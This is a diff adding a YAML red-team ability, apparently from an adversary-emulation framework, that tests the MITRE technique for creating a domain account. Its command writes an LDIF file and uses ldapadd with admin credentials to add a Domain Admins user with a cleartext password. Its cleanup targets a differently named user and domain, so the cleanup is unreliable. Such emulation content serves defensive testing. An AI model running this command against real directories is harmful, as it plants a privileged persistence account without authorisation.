@@ -1,0 +1,25 @@
+- description: 'Use Admin Credentials to Create A Domain Admin Account
+
+    '
+  id: e5d6ce32-9c91-d382-aaa3-2b4915927cc7
+  name: Active Directory Create Admin Account
+  platforms:
+    linux:
+      sh:
+        cleanup: 'echo removing Atomic User (temporary user); echo "dn: cn=Atomic
+          User,cn=Users,dc=scwxscratch,dc=dev\nchangetype: delete" > deleteuser.ldif;
+          ldapmodify -H ldap://adVM:389 -x -D admin@example.test -w s3CurePssw0rD!
+          -f deleteuser.ldif; rm deleteuser.ldif; rm tempadmin.ldif'
+        command: 'echo "dn: CN=Admin User,CN=Users,DC=example,DC=test\nchangetype:
+          add\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass:
+          user\ncn: Admin User\nsn: User\ngivenName: Atomic User\nuserPrincipalName:
+          adminuser@example.test\nsAMAccountName: adminuser\nuserAccountControl: 512\nuserPassword:
+          {CLEARTEXT}s3CureP4ssword123!\nmemberOf: CN=Domain Admins,CN=Users,DC=example,DC=test"
+          > tempadmin.ldif; echo ldapadd -H ldap://example.test:389 -x -D admin@example.test
+          -w s3CurePssw0rD! -f tempadmin.ldif; ldapadd -H ldap://example.test:389
+          -x -D admin@example.test -w s3CurePssw0rD! -f tempadmin.ldif'
+        payloads: []
+  tactic: persistence
+  technique:
+    attack_id: T1136.002
+    name: 'Create Account: Domain Account'
